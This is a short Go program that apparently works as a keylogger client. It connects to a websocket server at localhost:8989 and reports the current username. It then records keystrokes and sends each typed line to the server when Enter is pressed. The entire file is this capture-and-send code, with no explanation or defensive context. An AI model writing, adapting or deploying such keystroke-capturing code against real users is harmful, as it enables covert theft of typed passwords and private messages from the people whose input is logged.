package main

import (
	"os/user"
	"strings"

	"github.com/eiannone/keyboard"
	"github.com/gorilla/websocket"
)

func main() {
	var data []string
	var text string
	url := "ws://localhost:8989"
	conn, _, _ := websocket.DefaultDialer.Dial(url, nil)
	currentUser, _ := user.Current()
	conn.WriteMessage(websocket.TextMessage, []byte("Im Connected | Username : "+currentUser.Username))
	keysEvents, _ := keyboard.GetKeys(10)
	for {
		event := <-keysEvents

		data = append(data, string(event.Rune))

		if event.Key == keyboard.KeyEnter {
			text = strings.Join(data, "")
			conn.WriteMessage(websocket.TextMessage, []byte(text))
			data = nil
		}
	}

}
